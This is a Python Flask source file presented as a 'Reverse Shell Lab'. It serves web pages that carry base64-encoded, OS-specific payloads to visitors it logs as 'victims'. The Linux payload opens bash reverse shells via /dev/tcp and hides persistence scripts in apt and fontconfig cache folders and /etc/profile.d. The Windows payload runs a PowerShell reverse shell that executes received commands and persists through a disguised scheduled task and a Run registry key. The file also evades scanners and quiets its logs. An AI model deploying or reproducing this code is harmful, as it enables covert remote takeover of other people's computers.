#!/usr/bin/env python3
"""
Reverse Shell Lab - Flask Application
For educational purposes only - Use only in isolated lab environments
"""

from flask import Flask, send_file, request, make_response, redirect, url_for, send_from_directory
import logging
import socket
import threading
import time
import base64
import hashlib
from datetime import datetime
import os
import sys

# ==================== CONFIGURATION ====================
app = Flask(__name__, 
            static_folder='.',  # Serve static files from current directory
            static_url_path='')  # Serve from root URL

# Configure logging to be less noisy
logging.basicConfig(level=logging.WARNING)
werkzeug_logger = logging.getLogger('werkzeug')
werkzeug_logger.setLevel(logging.ERROR)

# Suppress specific error messages
class FilterScannerNoise(logging.Filter):
    def filter(self, record):
        msg = record.getMessage()
        if '400' in msg and ('\x16' in msg or 'Bad request' in msg):
            return False
        if 'code 400' in msg:
            return False
        if 'TLS' in msg or 'SSL' in msg:
            return False
        return True

werkzeug_logger.addFilter(FilterScannerNoise())

# ==================== NETWORK DETECTION ====================
def get_local_ip():
    """Get the actual local IP address automatically"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        try:
            return socket.gethostbyname(socket.gethostname())
        except:
            return "127.0.0.1"

SERVER_IP = get_local_ip()
PORT_START = 60000
PORT_END = 65535
FLASK_PORT = 5000

# Print banner
print(f"\n{'='*50}")
print(f"REVERSE SHELL LAB")
print(f"{'='*50}")
print(f"Server IP: {SERVER_IP}")
print(f"Flask Port: {FLASK_PORT}")
print(f"Reverse Shell Port Range: {PORT_START}-{PORT_END}")
print(f"Access URL: http://{SERVER_IP}:{FLASK_PORT}")
print(f"{'='*50}\n")

# ==================== PORT MANAGEMENT ====================
current_port = PORT_START
port_lock = threading.Lock()
active_ports = {}

def get_next_port():
    """Get next available port for new victim"""
    global current_port
    with port_lock:
        port = current_port
        current_port += 1
        if current_port > PORT_END:
            current_port = PORT_START
        return port

# ==================== PAYLOADS ====================

# Linux Cache Persistence Payload
LINUX_CACHE_PAYLOAD = '''#!/bin/bash

# Auto-detect server IP
find_server() {
    GATEWAY=$(ip route | grep default | awk '{print $3}' | head -1)
    if [ ! -z "$GATEWAY" ]; then
        NETWORK=$(echo $GATEWAY | cut -d. -f1-3)
        for TRY_IP in "$NETWORK.10" "$NETWORK.100" "$NETWORK.1" "$NETWORK.254"; do
            if ping -c 1 -W 1 $TRY_IP >/dev/null 2>&1; then
                echo "$TRY_IP"
                return
            fi
        done
    fi
    echo "{SERVER_IP}"
}

SERVER_IP=$(find_server)
SERVER_PORT={PORT}

# Reverse shell function
reverse_shell() {{
    while true; do
        bash -i >& /dev/tcp/$SERVER_IP/$SERVER_PORT 0>&1
        sleep 30
    done &
}}

# Install in multiple cache locations
install_persistence() {{
    mkdir -p /var/cache/apt/archives
    cat > /var/cache/apt/archives/.system-update << 'EOF'
#!/bin/bash
SERVER_IP={SERVER_IP}
SERVER_PORT={PORT}
while true; do bash -i >& /dev/tcp/$SERVER_IP/$SERVER_PORT 0>&1; sleep 60; done &
EOF
    chmod +x /var/cache/apt/archives/.system-update
    
    mkdir -p /var/cache/fontconfig
    cat > /var/cache/fontconfig/.font-update << 'EOF'
#!/bin/bash
SERVER_IP={SERVER_IP}
SERVER_PORT={PORT}
nohup bash -c "while true; do bash -i >& /dev/tcp/$SERVER_IP/$SERVER_PORT 0>&1; sleep 120; done" &
EOF
    chmod +x /var/cache/fontconfig/.font-update
    
    cat > /etc/profile.d/network.sh << 'EOF'
#!/bin/bash
nohup bash -c "while true; do bash -i >& /dev/tcp/{SERVER_IP}/{PORT} 0>&1; sleep 300; done" &
EOF
    chmod +x /etc/profile.d/network.sh
}}

install_persistence
reverse_shell
echo "[+] Cache persistence installed"
'''

# Windows Cache Persistence Payload
WINDOWS_CACHE_PAYLOAD = '''# Auto-detecting reverse shell

function Find-Server {
    try {
        $gateway = (Get-NetRoute -DestinationPrefix 0.0.0.0/0 | Select-Object -First 1).NextHop
        if ($gateway) {
            $network = $gateway -replace '\\.[^.]*$', ''
            $tryIps = @("$network.10", "$network.100", "$network.1", "$network.254")
            foreach ($ip in $tryIps) {
                if (Test-Connection -Count 1 -Quiet $ip) {
                    return $ip
                }
            }
        }
    } catch {}
    return "{SERVER_IP}"
}

$serverIp = Find-Server
$serverPort = {PORT}

$reverseShell = @'
while($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($serverIp, {PORT})
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
            $sendback = (iex $data 2>&1 | Out-String )
            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    } catch {
        Start-Sleep -Seconds 30
    }
}
'@

$dnsCachePath = "$env:SystemRoot\\System32\\dns\\cache"
if (!(Test-Path $dnsCachePath)) { New-Item -ItemType Directory -Path $dnsCachePath -Force }
$reverseShell | Out-File "$dnsCachePath\\dnscache.ps1"

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File `"$dnsCachePath\\dnscache.ps1`""
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "DnsCacheService" -Action $action -Trigger $trigger -Force

$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
Set-ItemProperty -Path $regPath -Name "WindowsUpdateSvc" -Value "powershell -WindowStyle Hidden -File `"$dnsCachePath\\dnscache.ps1`""

Write-Host "[+] Cache persistence installed for $serverIp`:$serverPort"
'''

# ==================== ERROR HANDLERS ====================

@app.errorhandler(400)
def handle_bad_request(e):
    return '', 400

@app.errorhandler(404)
def handle_not_found(e):
    return '', 404

@app.errorhandler(500)
def handle_server_error(e):
    return 'Server error', 500

@app.before_request
def before_request():
    if request.scheme == 'https':
        return redirect(f'http://{SERVER_IP}:{FLASK_PORT}{request.path}')
    
    user_agent = request.headers.get('User-Agent', '')
    if len(user_agent) > 0 and ord(user_agent[0]) < 32:
        return '', 400
    
    scanner_paths = ['.git', '.env', 'wp-admin', 'admin', 'phpmyadmin', 
                     'vendor', 'composer', 'package.json']
    for path in scanner_paths:
        if path in request.path:
            return '', 404

# ==================== STATIC FILE ROUTES ====================

@app.route('/index.css')
def serve_css():
    """Serve index.css"""
    try:
        return send_from_directory('.', 'index.css')
    except:
        return '', 404

@app.route('/script.js')
def serve_js():
    """Serve script.js"""
    try:
        return send_from_directory('.', 'script.js')
    except:
        return '', 404

# Catch-all for other static files (if needed)
@app.route('/<path:filename>')
def serve_static(filename):
    """Serve other static files"""
    # Don't serve if it's a directory traversal attempt
    if '..' in filename or filename.startswith('/'):
        return '', 404
    
    # List of allowed static file extensions
    allowed_extensions = ['.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.woff', '.woff2', '.ttf']
    
    # Check if file has an allowed extension
    if any(filename.endswith(ext) for ext in allowed_extensions):
        try:
            return send_from_directory('.', filename)
        except:
            return '', 404
    
    return '', 404

# ==================== MAIN ROUTE ====================

@app.route('/')
def index():
    """Main page - serves the website with payload"""
    visitor_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # Skip logging for scanners
    if any(scanner in user_agent for scanner in ['curl', 'wget', 'python', 'go', 'java']):
        return '', 200
    
    # Assign unique port for this victim
    victim_port = get_next_port()
    
    # Generate session ID
    session_id = hashlib.md5(f"{visitor_ip}{time.time()}".encode()).hexdigest()[:8]
    
    # Log real victims (optional)
    print(f"[+] Victim {visitor_ip} (ID: {session_id}) assigned port {victim_port}")
    
    # Read index.html with proper encoding
    try:
        with open('index.html', 'r', encoding='utf-8') as file:
            html_content = file.read()
    except UnicodeDecodeError:
        try:
            with open('index.html', 'r', encoding='latin-1') as file:
                html_content = file.read()
        except FileNotFoundError:
            return "index.html not found", 404
    except FileNotFoundError:
        return "index.html not found", 404
    
    # Choose payload based on OS
    if 'windows' in user_agent:
        cache_payload = WINDOWS_CACHE_PAYLOAD
    else:
        cache_payload = LINUX_CACHE_PAYLOAD
    
    # Replace placeholders
    cache_payload = cache_payload.replace('{SERVER_IP}', SERVER_IP)
    cache_payload = cache_payload.replace('{PORT}', str(victim_port))
    
    # Encode payload
    encoded_payload = base64.b64encode(cache_payload.encode()).decode()
    
    # Inject into HTML - make sure paths are correct
    html_content = html_content.replace('{{SERVER_IP}}', SERVER_IP)
    html_content = html_content.replace('{{SERVER_PORT}}', str(victim_port))
    html_content = html_content.replace('{{SESSION_ID}}', session_id)
    html_content = html_content.replace('{{CACHE_PAYLOAD}}', encoded_payload)
    
    # Fix CSS/JS paths if they're using relative paths
    html_content = html_content.replace('href="index.css"', 'href="/index.css"')
    html_content = html_content.replace("href='index.css'", "href='/index.css'")
    html_content = html_content.replace('src="script.js"', 'src="/script.js"')
    html_content = html_content.replace("src='script.js'", "src='/script.js'")
    
    response = make_response(html_content)
    return response

# ==================== HEALTH CHECK ====================

@app.route('/health')
def health():
    return {'status': 'ok', 'ip': SERVER_IP, 'port': FLASK_PORT}

# ==================== ROBOTS.TXT ====================

@app.route('/robots.txt')
def robots():
    return "User-agent: *\nDisallow: /"

# ==================== MAIN ====================

if __name__ == '__main__':
    # Check if required files exist
    if not os.path.exists('index.html'):
        print("\n❌ index.html not found in current directory!")
        print(f"   Current directory: {os.getcwd()}")
        sys.exit(1)
    
    if not os.path.exists('index.css'):
        print("⚠️  index.css not found - styles may not load")
    
    if not os.path.exists('script.js'):
        print("⚠️  script.js not found - JavaScript may not work")
    
    print(f"\n📁 Files found in {os.getcwd()}:")
    for file in os.listdir('.'):
        if file.endswith(('.html', '.css', '.js')):
            print(f"   - {file}")
    
    print(f"\n🚀 Starting server...")
    
    try:
        app.run(host='0.0.0.0', port=FLASK_PORT, debug=False)
    except PermissionError:
        print(f"\n❌ Permission denied. Try using a port > 1024")
    except OSError as e:
        if "Address already in use" in str(e):
            print(f"\n❌ Port {FLASK_PORT} is already in use.")
            print(f"   Try: sudo kill $(sudo lsof -t -i:{FLASK_PORT})")
        else:
            print(f"\n❌ Error: {e}")